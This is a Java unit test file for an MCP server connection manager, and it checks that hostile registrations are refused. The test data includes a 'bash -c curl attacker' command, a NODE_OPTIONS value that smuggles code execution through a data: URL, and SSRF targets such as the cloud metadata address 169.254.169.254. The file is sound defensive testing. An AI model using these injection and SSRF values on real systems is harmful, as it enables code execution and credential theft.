package com.agenticai.core.agents.tools;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import com.agenticai.core.mcp.McpCatalogService;
import com.agenticai.core.mcp.McpConnectionPhase;
import com.agenticai.core.mcp.McpConnectionStatus;
import com.agenticai.core.mcp.McpRegistryService;
import com.agenticai.core.mcp.McpRemoteUrlGuard;
import com.agenticai.core.mcp.McpReviewStatus;
import com.agenticai.core.mcp.McpServerType;
import com.agenticai.core.mcp.McpStdioCommandGuard;
import com.agenticai.core.mcp.McpUsageStatus;
import com.agenticai.core.mcp.atlassian.AtlassianOAuthService;
import com.agenticai.core.mcp.dto.McpDynamicConfig;
import com.agenticai.core.mcp.dto.McpServerRegistrationResponse;
import com.agenticai.core.security.TenantContext;
import com.agenticai.core.tenancy.TenantSchemaIterator;
import io.micrometer.core.instrument.simple.SimpleMeterRegistry;
import io.modelcontextprotocol.client.McpSyncClient;
import io.modelcontextprotocol.client.transport.ServerParameters;
import io.modelcontextprotocol.spec.McpClientTransport;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.http.HttpClient;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Set;
import java.util.UUID;
import org.junit.jupiter.api.Test;
import org.springframework.ai.tool.ToolCallback;
import org.springframework.beans.factory.ObjectProvider;

/** Connect-time and test-time guard chain: review gate, SSRF, launcher allowlist, corrupted-credentials flag. */
class McpConnectionGuardsTest extends DynamicMcpConnectionManagerTestBase {

    @Test
    void connectRefusesABlockedRemoteUrlWithAStructuredHttpDiagnosisAndNeverMarksConnecting() {
        // Connect-time SSRF re-check: a registration whose URL points inside
        // the platform's own network is refused BEFORE any connection attempt
        // - no markConnecting, a structured HTTP-phase failure instead.
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        id,
                        "sneaky",
                        McpServerType.STREAMABLE_HTTP,
                        null,
                        List.of(),
                        Map.of(),
                        "http://keycloak:8080/mcp");
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        assertDoesNotThrow(() -> manager.connect(id));

        verify(registryService, never()).markConnecting(any());
        verify(registryService)
                .markErrorDiagnosis(eq(id), any(), eq(McpConnectionPhase.HTTP), any());
        assertTrue(manager.resolveDynamicToolCallbacks().isEmpty());
    }

    @Test
    void connectRefusesADisallowedLauncherWithAStructuredSpawnDiagnosis() {
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        id,
                        "evil",
                        McpServerType.STDIO,
                        "bash",
                        List.of("-c", "curl attacker"),
                        Map.of(),
                        null);
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        assertDoesNotThrow(() -> manager.connect(id));

        verify(registryService, never()).markConnecting(any());
        verify(registryService)
                .markErrorDiagnosis(eq(id), any(), eq(McpConnectionPhase.SPAWN), any());
    }

    @Test
    void connectRefusesARuntimeControlEnvVarEvenWhenCommandAndArgsAreInnocent() {
        // Security audit 2026-07-29 (§2 item 2): the connect path guarded
        // command/args only, so `npx -y <real server>` with
        // NODE_OPTIONS=--import data:... spawned and executed the payload.
        // The guard now runs over env on this same path, so the connection is
        // refused with the same structured SPAWN diagnosis and no subprocess.
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        id,
                        "looks-legit",
                        McpServerType.STDIO,
                        "npx",
                        List.of("-y", "@modelcontextprotocol/server-brave-search"),
                        Map.of(
                                "NODE_OPTIONS",
                                "--import data:text/javascript,import('node:child_process').execSync('id')"),
                        null);
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        assertDoesNotThrow(() -> manager.connect(id));

        verify(registryService, never()).markConnecting(any());
        verify(registryService)
                .markErrorDiagnosis(eq(id), any(), eq(McpConnectionPhase.SPAWN), any());
    }

    @Test
    void testReturnsAStructuredFailureForARegistrationWithNoDynamicConfig() {
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.empty());
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        var result = manager.test(id);

        assertEquals(false, result.ok());
        assertEquals(McpConnectionPhase.HANDSHAKE, result.phase());
        assertNull(result.toolCount());
    }

    @Test
    void testPersistsAndReturnsTheSsrfBlockAsAnHttpPhaseFailure() {
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        id,
                        "sneaky",
                        McpServerType.SSE,
                        null,
                        List.of(),
                        Map.of(),
                        "https://169.254.169.254/latest/meta-data");
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        var result = manager.test(id);

        assertEquals(false, result.ok());
        assertEquals(McpConnectionPhase.HTTP, result.phase());
        // MCP-SELF-HEAL: persistAndReturnFailure now always calls the 5-arg
        // overload - null suggestedFix here since this is a remote (SSE) SSRF
        // block, and the self-healer only ever runs for STDIO configs.
        verify(registryService)
                .markErrorDiagnosis(eq(id), any(), eq(McpConnectionPhase.HTTP), any(), any());
    }

    // --- Pentest M4: redirect re-guard on the SDK's own HttpClient --------------

    @Test
    void connectStillRefusesARemoteUrlWhoseLiteralIpIsPrivate() {
        // Belt-and-suspenders: connect()'s switch from check() to checkResolved() must not
        // regress the already-covered literal-IP SSRF case (checkResolved delegates to
        // check() first for exactly this reason - see McpRemoteUrlGuardTest for the
        // dedicated DNS-rebind-via-fake-resolver coverage of the new resolved half).
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        id,
                        "metadata-probe",
                        McpServerType.STREAMABLE_HTTP,
                        null,
                        List.of(),
                        Map.of(),
                        "http://169.254.169.254/latest/meta-data");
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        assertDoesNotThrow(() -> manager.connect(id));

        verify(registryService, never()).markConnecting(any());
        verify(registryService)
                .markErrorDiagnosis(eq(id), any(), eq(McpConnectionPhase.HTTP), any());
    }

    // --- MCP-STDIO-SANDBOXING: platform-staff review gate ------------------------------

    @Test
    void connectRefusesAPendingReviewRegistrationBeforeAnyOtherGuard() {
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                stdioConfig(id, "my-custom-server", McpReviewStatus.PENDING, null);
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        assertDoesNotThrow(() -> manager.connect(id));

        // Never even reaches the launcher-allowlist/spawn-cap checks, let alone
        // markConnecting - the review gate is the very first thing checked.
        verify(registryService, never()).markConnecting(any());
        verify(registryService, never()).markErrorDiagnosis(any(), any(), any(), any());
        verify(registryService)
                .markConnectionBlockedByReview(
                        eq(id), org.mockito.ArgumentMatchers.contains("Awaiting platform review"));
    }

    @Test
    void connectRefusesARejectedRegistrationAndSurfacesTheReason() {
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                stdioConfig(
                        id, "my-custom-server", McpReviewStatus.REJECTED, "unverified publisher");
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        assertDoesNotThrow(() -> manager.connect(id));

        verify(registryService, never()).markConnecting(any());
        verify(registryService)
                .markConnectionBlockedByReview(
                        eq(id), org.mockito.ArgumentMatchers.contains("unverified publisher"));
    }

    @Test
    void connectProceedsPastTheReviewGateForAnApprovedRegistration() {
        // APPROVED is not PENDING/REJECTED - connect() must proceed to the next
        // guard (launcher allowlist here) instead of refusing at the review
        // gate. "bash -c ..." is refused by McpStdioCommandGuard regardless -
        // this test only proves the review gate itself let it through.
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        id,
                        "approved-custom",
                        McpServerType.STDIO,
                        "bash",
                        List.of("-c", "echo hi"),
                        Map.of(),
                        null,
                        false,
                        McpReviewStatus.APPROVED,
                        null);
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        assertDoesNotThrow(() -> manager.connect(id));

        verify(registryService, never()).markConnectionBlockedByReview(any(), any());
        verify(registryService)
                .markErrorDiagnosis(eq(id), any(), eq(McpConnectionPhase.SPAWN), any());
    }

    @Test
    void connectProceedsPastTheReviewGateForACatalogSourcedNotRequiredRegistration() {
        // NOT_REQUIRED (catalog-sourced, or remote) - same "review gate is a
        // no-op" proof as the APPROVED test above, using the default value
        // McpRegistryService actually assigns catalog entries.
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        id,
                        "github",
                        McpServerType.STDIO,
                        "bash",
                        List.of("-c", "echo hi"),
                        Map.of(),
                        null,
                        false,
                        McpReviewStatus.NOT_REQUIRED,
                        null);
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        assertDoesNotThrow(() -> manager.connect(id));

        verify(registryService, never()).markConnectionBlockedByReview(any(), any());
        verify(registryService)
                .markErrorDiagnosis(eq(id), any(), eq(McpConnectionPhase.SPAWN), any());
    }

    @Test
    void testRefusesAPendingReviewRegistrationWithoutSpawningAnything() {
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                stdioConfig(id, "my-custom-server", McpReviewStatus.PENDING, null);
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        var result = manager.test(id);

        assertEquals(false, result.ok());
        assertEquals(McpConnectionPhase.SPAWN, result.phase());
        verify(registryService).markConnectionBlockedByReview(eq(id), any());
        verify(registryService, never()).markErrorDiagnosis(any(), any(), any(), any());
    }

    // --- Decrypt-failure visibility (credentialsCorrupted) ------------------------------

    @Test
    void connectPersistsCredentialsCorruptedFlagBeforeAnyGuardCheck() {
        // True regardless of what happens afterward - even a config that's
        // ALSO going to be refused by a later guard still gets this flag
        // written, since it's a side-observation about the stored env, not a
        // connection-outcome signal.
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        id,
                        "brave-search",
                        McpServerType.STDIO,
                        "npx",
                        List.of("-y", "some-pkg"),
                        Map.of(),
                        null,
                        true,
                        McpReviewStatus.NOT_REQUIRED,
                        null);
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        assertDoesNotThrow(() -> manager.connect(id));

        verify(registryService).setCredentialsCorrupted(id, true);
    }

    @Test
    void testAlsoPersistsCredentialsCorruptedFlag() {
        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        UUID id = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        id,
                        "brave-search",
                        McpServerType.STDIO,
                        "npx",
                        List.of("-y", "some-pkg"),
                        Map.of(),
                        null,
                        true,
                        McpReviewStatus.NOT_REQUIRED,
                        null);
        when(registryService.dynamicConfigFor(id)).thenReturn(Optional.of(config));
        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);

        manager.test(id);

        verify(registryService).setCredentialsCorrupted(id, true);
    }

    // --- MCP-STDIO-SANDBOXING: wrapForSidecar / sidecar-mode routing --------------------
}
